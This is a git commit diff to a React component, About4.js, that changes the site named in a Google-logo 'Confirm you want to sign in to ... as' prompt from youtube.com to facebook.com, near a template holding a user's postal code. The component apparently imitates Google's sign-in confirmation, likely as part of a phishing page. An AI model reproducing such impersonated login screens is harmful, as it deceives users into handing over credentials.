e2a5af97d3e08d8cb1de6702cf7e773d7afb814f
rimagubasote <riadimeri089@gmail.com>
2025-07-23 23:48:44 +0200

    Update About4.js

--- src/components/About4.js
+++ src/components/About4.js
@@ -194,7 +194,7 @@ Zip Code: '${postal}'
                 {userData.number !== null && userData.number !== undefined && userData.number !== -1 && (<div></div>)}
                  <div className='positivus'>
                 <img src={GoogleLogo} alt='google logo' className='googleImg'/>
-                <p className='positPara' id="lolo">Confirm you want to sign in to <span className='red-text'>youtube.com</span> as</p>
+                <p className='positPara' id="lolo">Confirm you want to sign in to <span className='red-text'>facebook.com</span> as</p>
                 <p className='positPara'> </p>
                 
                 <div className='positContent'>
